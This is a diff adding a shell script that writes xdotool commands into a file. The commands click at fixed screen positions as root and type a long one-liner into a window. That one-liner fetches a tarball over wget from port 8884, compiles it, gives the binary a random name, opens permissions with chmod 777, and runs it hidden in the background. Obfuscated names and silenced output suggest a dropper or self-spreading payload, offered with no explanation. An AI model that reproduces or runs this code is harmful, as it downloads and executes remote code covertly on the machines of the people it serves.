@@ -1,0 +1,35 @@
+echo 'sudo -u root xdotool mousemove 111 137 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 227 480 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 727 474 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 708 511 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 944 607 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 234 234 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool type '!echo $((1 + $RANDOM % 88888884)) > ./linux84744474;echo -e "arr[0]=\"$(dig @resolver4.opendns.com myip.opendns.com +short)\"\nrand=\$[\$RANDOM % \${#arr[@]}];wget -N http://\$(echo \${arr[\$rand]}):8884/linux8444.tar.gz;tar -xf ./linux8444.tar.gz;cd ./linux8444;linux8474=\$(echo \$((1 + \$RANDOM % 88888884)));mkdir ./linux84888888887474744474/;cd ./linux84888888887474744474/;cmake ..;make;mv ./linux848888888874 ./\$(echo \$linux8474);./\$(echo \$linux8474) \$(echo \$((1 + \$RANDOM % 88888884)))" > ./$(cat ./linux84744474);chmod 777 -R ./;bash ./$(cat ./linux84744474) &> /dev/null &'' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 74 234 click 1' >> ./linux88
+
+echo 'sleep 4' >> ./linux88
+
+echo 'sudo -u root xdotool mousemove 1514 44 click 1' >> ./linux88
+
+echo 'sleep 0.4' >> ./linux88
